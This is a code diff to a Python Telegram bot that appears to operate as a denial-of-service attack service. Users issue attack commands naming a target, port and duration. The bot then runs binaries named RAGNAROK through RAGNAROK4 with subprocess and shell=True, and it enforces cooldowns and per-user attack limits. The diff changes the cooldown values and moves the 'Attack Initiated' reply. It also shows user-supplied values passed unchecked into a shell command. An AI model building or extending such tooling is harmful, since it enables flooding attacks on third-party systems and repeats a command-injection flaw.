@@ -24,10 +24,10 @@ USER_FILE = "users.txt"
 
 # Cooldowns and binaries for each attack
 attack_cooldowns = {
-    'attack1': {'cooldown': 240, 'last_used': None, 'binary': 'RAGNAROK'},
+    'attack1': {'cooldown': 280, 'last_used': None, 'binary': 'RAGNAROK'},
     'attack2': {'cooldown': 300, 'last_used': None, 'binary': 'RAGNAROK1'},
-    'attack3': {'cooldown': 280, 'last_used': None, 'binary': 'RAGNAROK2'},
-    'attack4': {'cooldown': 300, 'last_used': None, 'binary': 'RAGNAROK3'},
+    'attack3': {'cooldown': 320, 'last_used': None, 'binary': 'RAGNAROK2'},
+    'attack4': {'cooldown': 400, 'last_used': None, 'binary': 'RAGNAROK3'},
     'attack5': {'cooldown': 340, 'last_used': None, 'binary': 'RAGNAROK4'}
 }
 
@@ -83,7 +83,7 @@ def handle_attack(message):
     now = datetime.datetime.now()
     if attack_data['last_used'] and (now - attack_data['last_used']).seconds < cooldown:
         remaining = cooldown - (now - attack_data['last_used']).seconds
-        bot.reply_to(message, f"⏳ **{command} is on cooldown:** `{remaining} seconds` remaining.")
+        bot.reply_to(message, f"⏳ **{command} is on cooldown:** `{remaining} seconds` remaining.\nCooldown started now.")
         return
 
     # Check usage requirements
@@ -118,15 +118,16 @@ def handle_attack(message):
 
     # Execute the attack
     full_command = f"./{binary} {target} {port} {time_duration}"
+    bot.reply_to(
+        message,
+        f"🚀 **Attack Initiated!**\n"
+        f"📍 **Target:** `{target}`\n"
+        f"🔢 **Port:** `{port}`\n"
+        f"⏱ **Duration:** `{time_duration} seconds`\n"
+        f"🧮 **Remaining Attacks:** `{ATTACK_LIMIT - user['attacks'] - 1}`"
+    )
+
     try:
-        bot.reply_to(
-            message,
-            f"🚀 **Attack Initiated!**\n"
-            f"📍 **Target:** `{target}`\n"
-            f"🔢 **Port:** `{port}`\n"
-            f"⏱ **Duration:** `{time_duration} seconds`\n"
-            f"🧮 **Remaining Attacks:** `{ATTACK_LIMIT - user['attacks'] - 1}`"
-        )
         subprocess.run(full_command, shell=True)
         bot.reply_to(message, f"✅ **Attack Completed Successfully!**")
     except Exception as e:
